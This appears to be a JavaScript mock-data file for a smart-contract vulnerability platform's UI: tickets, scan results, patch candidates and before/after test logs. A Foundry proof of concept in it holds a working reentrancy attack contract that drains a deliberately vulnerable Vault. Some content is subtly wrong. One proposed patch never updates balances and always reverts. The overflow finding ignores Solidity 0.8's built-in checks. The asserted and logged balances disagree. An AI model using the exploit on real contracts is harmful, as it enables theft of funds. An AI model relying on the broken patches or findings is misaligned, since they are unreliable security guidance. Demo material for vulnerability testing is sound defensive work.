export const navItems = [
  { key: 'overview', label: '总览 Dashboard', icon: '⌘', route: '/overview' },
  { key: 'tickets', label: '漏洞工单 Ops', icon: '✓', route: '/tickets' },
  { key: 'scan', label: '检测 Scan Center', icon: '◉', route: '/scan' },
  { key: 'verify', label: '验证 Verification Lab', icon: '⚡', route: '/verify' },
  { key: 'patch', label: '修复 Patch Studio', icon: '🔧', route: '/patch' }
];

export const overviewKpis = [
  {
    title: '候选漏洞（检测输出）',
    value: '23',
    tags: ['高危 6', '中危 11', '低危 6']
  },
  {
    title: '可复现（验证就绪）',
    value: '8',
    description: 'PoC 证据链已生成（trace + state diff + asset flow）'
  },
  {
    title: '已确认可利用（待修复）',
    value: '5',
    description: '建议优先进入修复流程，先处理 HIGH 且可复现项。'
  },
  {
    title: 'MTTR（检测到可复现）',
    value: '2.7h',
    description: '目标 <= 1h（自动化 PoC 回放与差分扫描）'
  }
];

export const lifecycleStatus = [
  { name: 'Detected', value: 10, level: 'warn' },
  { name: 'Reproducible', value: 8, level: 'warn' },
  { name: 'Confirmed', value: 5, level: 'bad' },
  { name: 'Patching', value: 3, level: 'warn' },
  { name: 'Verified', value: 4, level: 'good' },
  { name: 'Closed', value: 12, level: 'good' }
];

export const recentEvents = [
  { time: '16:02', event: 'PoC 自动生成完成（引导式 fuzz + 约束修补）', target: 'TCK-1042' },
  { time: '15:41', event: '交易语义还原完成（Tx1 -> Tx3）', target: 'TCK-1039' },
  { time: '15:10', event: '差分扫描完成（upgrade 前后）', target: 'RUN-8891' },
  { time: '14:32', event: '回归失败：变体攻击仍可绕过', target: 'TCK-1037' }
];

export const scanAgents = [
  {
    id: 'static',
    name: '静态分析 Agent',
    description: 'AST + 规则模板，快速筛查重入、权限、整数等基础漏洞。',
    tag: '推荐'
  },
  {
    id: 'symbolic',
    name: '符号执行 Agent',
    description: '探索关键路径，覆盖条件分支并输出路径约束。',
    tag: '深度'
  },
  {
    id: 'formal',
    name: '形式化验证 Agent',
    description: '根据安全断言进行模型校验，降低误报。',
    tag: '严格'
  },
  {
    id: 'fuzz',
    name: '模糊测试 Agent',
    description: '生成交易序列压测边界场景，发现异常资产流。',
    tag: '动态'
  }
];

export const scanTemplates = [
  '快速扫描（10min）',
  '标准审计（30min）',
  '深度审计（60min）'
];

export const defaultCode = `pragma solidity ^0.8.20;

contract Vault {
  mapping(address => uint256) public balances;

  function deposit() external payable {
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, 'insufficient');
    (bool ok,) = msg.sender.call{value: amount}('');
    require(ok, 'transfer failed');
    balances[msg.sender] -= amount;
  }
}`;

export const scanResults = [
  {
    id: 'FND-211',
    title: '重入风险：withdraw() 外部调用早于状态更新',
    severity: 'HIGH',
    confidence: '0.92',
    nextRoute: '/tickets'
  },
  {
    id: 'FND-305',
    title: '授权范围过宽：approve 默认无限额度',
    severity: 'MED',
    confidence: '0.74',
    nextRoute: '/tickets'
  },
  {
    id: 'FND-118',
    title: '预言机偏离阈值缺失（可被短时操纵）',
    severity: 'HIGH',
    confidence: '0.68',
    nextRoute: '/tickets'
  }
];

export const tickets = [
  {
    id: 'TCK-1042',
    title: 'Vault合约重入漏洞 - 资产可被恶意提取',
    severity: 'high',
    stage: '待确认',
    status: 'Reproducible',
    type: 'Reentrancy / Asset Drain',
    chain: 'Ethereum',
    contract: '0x52d6bBD6088219aF3E36305168354297244169bF',
    confidence: 0.92,
    oneLine: 'withdraw() 外部调用在状态更新前执行，攻击者可通过 fallback 重入重复提取资金，造成资产转移。',
    dependency: '需要 fallback + 多交易',
    suggestion: '先跑引导式fuzz，生成序列',
    upgradeDifficulty: '中 (UUPS)',
    rootConstraints: ['CEI / 先更新状态', '阻断 fallback 重入', '接口事件保持兼容'],
    findings: [
      '未使用ReentrancyGuard防重入锁',
      '外部转账（call）执行在状态更新前',
      'fallback函数可触发重复提款逻辑',
      '无提款频率/额度限制的兜底校验'
    ],
    codeSnippet: `function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // ✗ 错误：外部调用先于状态更新，存在重入风险
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    // ✗ 状态更新滞后，重入时余额未清零
    balances[msg.sender] -= amount;
}`,
    constraints: [
      '修复后需保持原有接口参数不变',
      'Gas消耗增量不得超过5%',
      '兼容代理合约的升级逻辑',
      '不影响正常用户的存款/提款业务'
    ],
    patchCandidates: [
      {
        key: 'A',
        title: 'CEI模式调整',
        diff: `function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // ✅ 先更新状态
    balances[msg.sender] -= amount;
    // ✅ 后执行外部调用
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}`,
        impact: {
          gas: '+1.2%',
          compat: '接口不变',
          upgrade: '完全兼容',
          risk: 'Low'
        }
      },
      {
        key: 'B',
        title: '添加ReentrancyGuard锁',
        diff: `contract Vault is ReentrancyGuard {
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= amount;
    }
}`,
        impact: {
          gas: '+3.8%',
          compat: '继承接口小改动',
          upgrade: '兼容',
          risk: 'Low'
        }
      },
      {
        key: 'C',
        title: '双重校验+时间锁',
        diff: `uint256 public lastWithdrawTime;
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    require(block.timestamp > lastWithdrawTime + 1 minutes, "Withdraw cooldown");
    lastWithdrawTime = block.timestamp;
    uint256 balanceBefore = balances[msg.sender];
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    require(balances[msg.sender] == balanceBefore - amount, "Invalid state");
}`,
        impact: {
          gas: '+4.5%',
          compat: '新增状态变量',
          upgrade: '需初始化时间锁',
          risk: 'Med'
        }
      }
    ]
  },
  {
    id: 'TCK-1043',
    title: 'ERC20合约授权无限批准漏洞',
    severity: 'high',
    stage: '待修复',
    status: 'Patching',
    type: '授权漏洞 / Infinite Approval',
    chain: 'BSC',
    contract: '0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6',
    confidence: 0.95,
    oneLine: 'approve函数未校验授权值是否为0，导致无限授权可被利用转移用户资产',
    dependency: '需要授权交易 + 前置余额',
    suggestion: '先校验授权清零逻辑，生成安全approve模板',
    upgradeDifficulty: '低 (无代理)',
    rootConstraints: ['零授权前置校验', 'ERC20标准兼容', '事件触发逻辑不变'],
    findings: [
      'approve函数未检查当前授权值是否为0',
      '无授权额度上限限制',
      '未触发授权变更事件'
    ],
    codeSnippet: `function approve(address spender, uint256 amount) external returns (bool) {
    // ✗ 错误：未校验现有授权值，可被抢授权
    allowance[msg.sender][spender] = amount;
    emit Approval(msg.sender, spender, amount);
    return true;
}`,
    constraints: [
      '需兼容ERC20标准接口',
      '保留原有事件触发逻辑',
      '支持批量授权场景'
    ],
    patchCandidates: [
      {
        key: 'A',
        title: '增加零授权校验',
        diff: `function approve(address spender, uint256 amount) external returns (bool) {
    require(allowance[msg.sender][spender] == 0 || amount == 0, "Approve non-zero to non-zero");
    allowance[msg.sender][spender] = amount;
    emit Approval(msg.sender, spender, amount);
    return true;
}`,
        impact: {
          gas: '+0.8%',
          compat: '接口不变',
          upgrade: '完全兼容',
          risk: 'Low'
        }
      }
    ]
  },
  {
    id: 'TCK-1044',
    title: '整数溢出漏洞 - 代币超额铸造',
    severity: 'critical',
    stage: '待确认',
    status: 'Reproducible',
    type: 'Integer Overflow / Mint Overflow',
    chain: 'Polygon',
    contract: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
    confidence: 0.98,
    oneLine: 'mint函数未做溢出校验，用户可传入大额参数触发溢出，铸造超额代币',
    dependency: '需要mint权限 + 整数溢出场景',
    suggestion: '先跑边界值fuzz，验证溢出场景',
    upgradeDifficulty: '高 (可升级代理)',
    rootConstraints: ['SafeMath 溢出校验', '铸造上限限制', '权限校验不变'],
    findings: [
      '未使用SafeMath库，无溢出校验',
      'mint数量无上限限制',
      '仅校验msg.sender权限，无其他约束'
    ],
    codeSnippet: `function mint(address to, uint256 amount) external onlyOwner {
    // ✗ 错误：无溢出校验，amount过大时totalSupply会溢出
    totalSupply += amount;
    balances[to] += amount;
    emit Transfer(address(0), to, amount);
}`,
    constraints: [
      '兼容原有mint接口',
      '不影响正常铸造逻辑',
      'Gas消耗增量不超过3%'
    ],
    patchCandidates: [
      {
        key: 'A',
        title: '溢出校验+SafeCast',
        diff: `function mint(address to, uint256 amount) external onlyOwner {
    require(amount <= MAX_MINT_AMOUNT, "Exceed max mint limit");
    totalSupply = SafeMath.add(totalSupply, amount);
    balances[to] = SafeMath.add(balances[to], amount);
    emit Transfer(address(0), to, amount);
}`,
        impact: {
          gas: '+2.1%',
          compat: '接口不变',
          upgrade: '完全兼容',
          risk: 'Low'
        }
      }
    ]
  }
];

export const defaultPocCode = `// Foundry 风格 PoC 验证脚本
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract ExploitTest is Test {
    Vault public vault;
    AttackContract public attacker;
    address public user = address(0x123);
    address public attackerAddr = address(0x456);

    function setUp() public {
        // 1. 初始化分叉环境
        vm.createSelectFork("mainnet", 19233001);
        // 2. 部署目标合约
        vault = new Vault();
        // 3. 正常用户存款
        vm.deal(user, 100 ether);
        vm.prank(user);
        vault.deposit{value: 100 ether}();
        // 4. 部署攻击合约
        attacker = new AttackContract(vault);
        vm.deal(address(attacker), 10 ether);
    }

    function testExploit() public {
        // 攻击执行
        console.log("=== 开始重入攻击测试 ===");
        console.log("攻击前合约余额: %d ETH", address(vault).balance / 1e18);
        console.log("攻击前攻击者余额: %d ETH", address(attacker).balance / 1e18);

        // 触发重入
        attacker.attack(10 ether);

        console.log("=== 攻击执行完成 ===");
        console.log("攻击后合约余额: %d ETH", address(vault).balance / 1e18);
        console.log("攻击后攻击者余额: %d ETH", address(attacker).balance / 1e18);

        // 验证资产流出
        assertEq(address(vault).balance, 90 ether);
        assertGt(address(attacker).balance, 10 ether);
        console.log("✅ 漏洞可复现，重入攻击成功");
    }
}

contract AttackContract {
    Vault public immutable vault;
    uint256 public amount;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function attack(uint256 _amount) external payable {
        amount = _amount;
        // 先存款
        vault.deposit{value: _amount}();
        // 触发提款，进入重入
        vault.withdraw(_amount);
    }

    // Fallback 函数，重入入口
    fallback() external payable {
        if (address(vault).balance >= amount) {
            vault.withdraw(amount);
        }
    }

    receive() external payable {
        if (address(vault).balance >= amount) {
            vault.withdraw(amount);
        }
    }
}`;

// 替换原有pocSemanticData为以下结构化数据
export const pocSemanticData = [
  {
    step: 1,
    from: '测试合约',
    to: '攻击合约',
    function: 'constructor()',
    action: '部署攻击合约并初始化分叉环境，锁定指定区块高度',
    result: '执行成功',
    status: 'success',
    keyState: 'Fork Block: 19233001，目标合约初始余额: 100 ETH',
    params: {
      '分叉链': 'Ethereum Mainnet',
      '目标区块': '19233001',
      'RPC节点': '/mock-rpc'
    }
  },
  {
    step: 2,
    from: '攻击者地址',
    to: '攻击合约',
    function: 'attack()',
    action: '攻击者合约调用 deposit 存入本金，为后续重入攻击做准备',
    result: '执行成功',
    status: 'success',
    keyState: 'attacker.balances 更新为 10 ETH',
    params: {
      '存入金额': '10 ETH',
      '调用方': '攻击者地址(0x456)',
      '接收方': 'Vault目标合约'
    },
    children: [
      {
        step: '内部调用',
        from: '攻击合约',
        to: 'Vault目标合约',
        function: 'deposit()',
        result: '余额更新成功',
        action: '向Vault合约存入10 ETH，更新攻击者在合约中的余额记录'
      }
    ]
  },
  {
    step: 3,
    from: '攻击合约',
    to: 'Vault目标合约',
    function: 'withdraw()',
    action: '调用 withdraw(10 ETH) 触发外部转账，开启重入窗口',
    result: '执行成功',
    status: 'warning',
    keyState: '外部调用先于状态更新，重入窗口开启',
    params: {
      '提款金额': '10 ETH',
      '接收地址': '攻击合约地址'
    },
    children: [
      {
        step: '外部转账',
        from: 'Vault目标合约',
        to: '攻击合约',
        function: 'call{value: 10 ETH}',
        result: '转账成功',
        action: '10 ETH 转入攻击合约，自动触发 fallback 重入函数'
      }
    ]
  },
  {
    step: 4,
    from: '攻击合约',
    to: 'Vault目标合约',
    function: 'fallback()',
    action: 'fallback回调中再次调用 withdraw 函数，执行重入攻击',
    result: '执行成功',
    status: 'error',
    keyState: '重复提取成功，资产持续流出',
    params: {
      '重入次数': '1次',
      '重复提取金额': '10 ETH'
    },
    children: [
      {
        step: '循环重入',
        from: '攻击合约',
        to: 'Vault目标合约',
        function: 'withdraw()',
        result: '循环执行直到合约余额耗尽',
        action: '只要目标合约余额充足，就持续触发提款逻辑'
      }
    ]
  },
  {
    step: 5,
    from: 'Vault目标合约',
    to: '攻击合约',
    function: 'withdraw() 收尾',
    action: '重入完成，状态更新执行，攻击者余额被错误清零',
    result: '攻击完成',
    status: 'error',
    keyState: '攻击完成，目标合约资产被盗取，最终余额: 80 ETH',
    params: {
      '攻击后合约余额': '80 ETH',
      '攻击后攻击者余额': '30 ETH',
      '资产流失总额': '20 ETH'
    }
  }
];

export const pocKeyConstraints = [
  "CEI 模式未遵守：外部调用早于状态更新",
  "未使用 ReentrancyGuard 防重入锁",
  "fallback/receive 函数可触发重复提款",
  "无提款频率与额度的额外校验"
];

// ========== 修复与验证页专属 Mock 数据 ==========
export const patchVerifyItems = [
  { name: 'PoC 是否被阻断（漏洞 Blocked）', status: 'Pending', key: 'blocked' },
  { name: '关键断言（资产流出=0）', status: 'Pending', key: 'assetFlow' },
  { name: '业务语义（事件/返回值）', status: 'Pending', key: 'business' },
  { name: '变体攻击回归', status: 'Pending', key: 'variants' }
];

export const beforeFixLogs = `[14:32:00] 开始执行原始PoC测试
[14:32:01] Fork 环境初始化完成，Block: 19233001
[14:32:01] 目标合约部署完成，地址: 0x52d6...bBD6
[14:32:02] 正常用户存款完成，余额: 100 ETH
[14:32:02] 攻击合约部署完成
[14:32:03] === 开始重入攻击测试 ===
[14:32:03] 攻击前合约余额: 100 ETH
[14:32:03] 攻击前攻击者余额: 10 ETH
[14:32:04] 触发 withdraw 调用，外部转账执行
[14:32:04] 进入 fallback 重入函数
[14:32:05] 重入调用 withdraw 成功，再次提取 10 ETH
[14:32:05] 循环重入执行完成，共提取 20 ETH
[14:32:06] === 攻击执行完成 ===
[14:32:06] 攻击后合约余额: 80 ETH
[14:32:06] 攻击后攻击者余额: 30 ETH
[14:32:06] ✅ 漏洞可复现，重入攻击成功
[14:32:06] 测试用例执行通过，漏洞确认有效`;

export const afterFixLogs = `[14:35:00] 开始执行补丁后PoC回归测试
[14:35:01] Fork 环境初始化完成，Block: 19233001
[14:35:01] 补丁后合约部署完成，地址: 0x52d6...bBD6
[14:35:02] 正常用户存款完成，余额: 100 ETH
[14:35:02] 攻击合约部署完成
[14:35:03] === 开始重入攻击测试 ===
[14:35:03] 攻击前合约余额: 100 ETH
[14:35:03] 攻击前攻击者余额: 10 ETH
[14:35:04] 触发 withdraw 调用，状态更新先于外部转账
[14:35:04] 攻击者余额已清零，重入窗口关闭
[14:35:04] 外部转账执行，进入 fallback 函数
[14:35:05] fallback 中调用 withdraw，触发余额不足校验
[14:35:05] ❌ 交易回滚: insufficient balance
[14:35:06] === 攻击执行失败 ===
[14:35:06] 攻击后合约余额: 100 ETH
[14:35:06] 攻击后攻击者余额: 10 ETH
[14:35:06] ✅ 漏洞已修复，重入攻击被阻断
[14:35:06] 测试用例执行失败，符合预期修复效果`;